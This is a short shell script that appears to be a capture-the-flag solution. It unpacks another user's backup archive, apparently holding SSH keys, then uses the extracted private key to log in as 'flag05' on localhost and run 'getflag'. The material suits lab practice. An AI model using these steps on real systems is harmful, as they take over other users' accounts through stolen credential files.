set -x
tar -xzvf /home/flag05/.backup/backup-19072011.tgz -C ~/
printf 'yes\n' | ssh -i ~/.ssh/id_rsa -oStrictHostKeyChecking=no flag05@localhost 'whoami; getflag; exit'
exit 0
